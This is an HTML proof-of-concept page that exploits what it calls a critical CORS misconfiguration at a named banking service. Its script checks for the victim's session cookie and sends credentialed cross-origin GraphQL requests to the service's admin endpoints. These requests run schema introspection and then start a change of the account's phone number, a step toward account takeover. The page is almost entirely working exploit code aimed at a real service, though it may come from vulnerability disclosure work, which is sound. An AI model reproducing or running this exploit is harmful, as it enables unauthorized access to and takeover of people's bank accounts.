<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Swan CORS Critical PoC</title>
  <style>
    body { font-family:system-ui; margin:2rem; color:#111 }
    pre  { background:#f8f8f8; padding:1rem; border:1px solid #e1e1e1; overflow:auto }
    a.login { color:blue; text-decoration:underline; cursor:pointer }
  </style>
</head>
<body>
  <h2>⚠️ Swan Banking – Critical CORS Misconfiguration PoC ⚠️</h2>
  <p>This page is served from <strong id="origin"></strong>.</p>
  <p id="note">Checking login status…</p>
  <pre id="log"></pre>

  <script>
    const origin = location.origin;
    document.getElementById('origin').textContent = origin;

    function log(line) {
      document.getElementById('log').textContent += line + '\n';
    }

    // 1) If no swan_session_id cookie, redirect to dashboard login
    if (!document.cookie.includes('swan_session_id=')) {
      const loginUrl = 'https://dashboard.swan.io/login?redirect_uri=' + encodeURIComponent(origin + location.pathname);
      document.getElementById('note').innerHTML =
        '🔒 Not logged in. <a class="login" href="' + loginUrl + '">Click here to sign in</a> and then reload.';
      throw new Error('Redirecting to login…');
    }

    document.getElementById('note').textContent = '✅ Logged in. Running exploit…';

    // 2) Generic fetch helper
    async function gql(path, query) {
      const res = await fetch('https://api.swan.io' + path, {
        method:       'POST',
        credentials:  'include',
        headers:      { 'Content-Type':'application/json' },
        body:         JSON.stringify({ query })
      });
      const txt = await res.text();
      log(`=== ${path} ===\nStatus: ${res.status} ${res.statusText}\n${txt}\n`);
      return JSON.parse(txt).data;
    }

    (async () => {
      // a) Schema introspection
      await gql('/admin/graphql', '{ __schema { queryType { name } } }');

      // b) Queue phone-change
      //    (we don’t need the victim’s real number for exploit; use dummy)
      const oldN = '+33600000002';
      const rand8 = () => Math.floor(10000000 + Math.random()*90000000);
      const newN = '+336' + rand8();
      log(`▶ Attempting change from ${oldN} → ${newN}\n`);

      await gql('/admin-auth/graphql', `
        mutation {
          startPhoneNumberModification(input:{
            oldPhoneNumber:"${oldN}",
            newPhoneNumber:"${newN}"
          }) {
            __typename
            ... on StartPhoneNumberModificationSuccessPayload { phoneNumberModification { id } }
            ... on PhoneNumberModificationAlreadyExistsRejection { message }
            ... on TooManyPhoneNumberModificationRejection { message }
          }
        }`);
    })();
  </script>
</body>
</html>
